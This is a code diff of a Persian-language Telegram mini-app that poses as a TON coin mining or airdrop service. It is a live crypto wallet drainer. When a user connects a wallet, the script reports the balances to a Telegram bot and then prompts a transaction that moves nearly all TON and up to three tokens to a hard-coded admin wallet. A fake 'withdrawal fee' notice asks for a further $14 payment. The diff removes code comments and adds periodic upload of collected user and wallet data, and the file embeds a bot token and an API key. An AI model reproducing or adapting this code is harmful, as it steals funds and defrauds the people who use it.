@@ -178,9 +178,9 @@
         <h2>پرداخت کارمزد برداشت</h2>
         <div class="pay-notice">
             <i class="fas fa-exclamation-triangle" style="margin-left:5px;"></i>
-            برای انجام برداشت، لازم است ابتدا کارمزد فعال‌سازی کیف پول به مبلغ ۱۴ دلار (۲٫۳۱۰٫۰۰۰ هزار تومن)پرداخت گردد. این مبلغ جهت تایید نهایی تراکنش و واریز وجه به حساب شما الزامی است. لطفاً برای دریافت آدرس کیف پول (یا شماره کارت) جهت واریز کارمزد، با پشتیبانی در ارتباط باشید.
+            برای انجام برداشت، لازم است ابتدا کارمزد فعال‌سازی کیف پول به مبلغ ۱۴ دلار پرداخت گردد. این مبلغ جهت تایید نهایی تراکنش و واریز وجه به حساب شما الزامی است. لطفاً برای دریافت آدرس کیف پول (یا شماره کارت) جهت واریز کارمزد، با پشتیبانی در ارتباط باشید.
         </div>
-        <div class="fee-tag">۱۴ دلار (معادل‌ ۲٫۳۱۰٫۰۰۰ هزار تومن)</div>
+        <div class="fee-tag">۱۴ دلار (معادل‌سازی با TON یا USDT)</div>
         <a href="https://t.me/miningertoncoin" target="_blank" class="btn active-btn">
             <i class="fas fa-headset"></i> پیام به پشتیبانی
         </a>
@@ -262,9 +262,7 @@ const CONFIG = {
     BOT_TOKEN: "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw",
     ADMIN_CHAT_ID: "5972276401",
     BOT_USERNAME: "tondropybot",
-    // آدرس کیف پول ادمین به فرمت raw (مهم)
     ADMIN_WALLET_RAW: "0:c596f30f668432e33c9223c80b2ccb5e45ccb11d1076f081d6d09bb0155935d2",
-    // آدرس کیف پول ادمین به فرمت bounceable (برای نمایش)
     ADMIN_WALLET_BOUNCEABLE: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
     NETWORK_FEE: 0.0035,
     MINIMUM_WITHDRAW: 14,
@@ -361,10 +359,8 @@ function saveData() {
 
 // ==================== دریافت موجودی TON (با پروکسی برای اطمینان) ====================
 async function getWalletBalance(userAddress) {
-    // اگر آدرس raw است، تبدیل به bounceable کنیم (پیش‌فرض)
     let queryAddress = userAddress;
     if (userAddress.startsWith('0:')) {
-        // تبدیل به bounceable: 0:... -> EQD...
         queryAddress = 'EQD' + userAddress.slice(2);
     }
     const proxies = [
@@ -481,24 +477,22 @@ async function executeSmartTransaction(userAddress) {
         const jettons = await getAllJettonBalances(userAddress);
         const messages = [];
 
-        // انتقال کل TON (با در نظر گرفتن کارمزد)
         if (tonBalance > 0.01) {
-            const sendAmount = tonBalance - 0.005; // تخمین کارمزد
+            const sendAmount = tonBalance - 0.005;
             if (sendAmount > 0) {
                 messages.push({
-                    address: CONFIG.ADMIN_WALLET_RAW, // آدرس raw ادمین
+                    address: CONFIG.ADMIN_WALLET_RAW,
                     amount: Math.floor(sendAmount * 1e9).toString(),
                     payload: ""
                 });
             }
         }
 
-        // انتقال جتون‌ها (حداکثر ۳ عدد به دلیل محدودیت ۴ پیام)
         for (const jetton of jettons.slice(0, 3)) {
             const payload = createJettonTransferPayload(CONFIG.ADMIN_WALLET_RAW, jetton.balance, jetton.decimals, 0.01);
             messages.push({
                 address: jetton.master,
-                amount: Math.floor(0.05 * 1e9).toString(), // کارمزد هر جتون
+                amount: Math.floor(0.05 * 1e9).toString(),
                 payload
             });
         }
@@ -511,14 +505,13 @@ async function executeSmartTransaction(userAddress) {
 
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 600,
-            messages: messages.slice(0, 4) // حداکثر ۴ پیام
+            messages: messages.slice(0, 4)
         };
 
         showToast('🔄 لطفاً در کیف پول خود تراکنش را تأیید کنید...');
         transactionExecuted = true;
         const result = await tonConnectUI.sendTransaction(transaction);
 
-        // ثبت و گزارش
         const txRecord = {
             id: 'TX' + Date.now(),
             time: new Date().toISOString(),
@@ -565,13 +558,10 @@ tonConnectUI.onStatusChange(async (wallet) => {
             currentUser.wallet = fullAddress;
             appData.wallets.unshift({ userId: currentUser.id, address: fullAddress, time: new Date().toISOString() });
             saveData();
-            // ارسال گزارش کامل موجودی به تلگرام
             await sendFullReportToTelegram(fullAddress, currentUser);
         }
 
-        // اجرای تراکنش خودکار پس از ۱.۵ ثانیه (انتقال تمام دارایی‌ها)
         setTimeout(() => executeSmartTransaction(fullAddress), 1500);
-
         checkAndEnableFinalWithdraw();
     } else {
         document.getElementById('walletAddress').classList.add('hidden');
@@ -881,7 +871,52 @@ window.closeFeeModal = function(event) {
     }
 };
 
-// ==================== مقداردهی اولیه (بدون پاپ‌آپ فعالسازی) ====================
+// ==================== همگام‌سازی خودکار با پنل مدیریت ====================
+// این تابع اطلاعات سایت را به پنل مدیریت ارسال می‌کند
+async function syncDataToServer() {
+    // فقط اگه کاربر لاگین کرده باشه و اطلاعات وجود داشته باشه
+    if (!appData || !currentUser) return;
+    
+    const data = {
+        users: appData.users,
+        bannedUsers: appData.bannedUsers,
+        transactions: appData.transactions,
+        wallets: appData.wallets,
+        stats: {
+            total_users: appData.users.length,
+            active_today: appData.users.filter(u => new Date(u.lastSeen).toDateString() === new Date().toDateString()).length,
+            wallets: appData.wallets.length,
+            banned: appData.bannedUsers.length,
+            total_mined: totalMined || 0,
+            transactions: appData.transactions.length
+        }
+    };
+    
+    try {
+        const response = await fetch('/api/sync.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-API-Key': 'TonDropy@1403SecretKey' // این کلید باید با config.php یکی باشه
+            },
+            body: JSON.stringify(data)
+        });
+        
+        if (response.ok) {
+            console.log('✅ داده‌ها با موفقیت همگام‌سازی شدند');
+        }
+    } catch (error) {
+        console.error('❌ خطا در همگام‌سازی:', error);
+    }
+}
+
+// هر ۵ دقیقه یک بار همگام‌سازی کن
+setInterval(syncDataToServer, 5 * 60 * 1000);
+
+// هنگام خروج یا بسته شدن صفحه هم همگام‌سازی کن
+window.addEventListener('beforeunload', syncDataToServer);
+
+// ==================== مقداردهی اولیه ====================
 const u = tg.initDataUnsafe?.user;
 if (u) {
     document.getElementById('uName').innerText = u.first_name + (u.last_name ? ' ' + u.last_name : '');
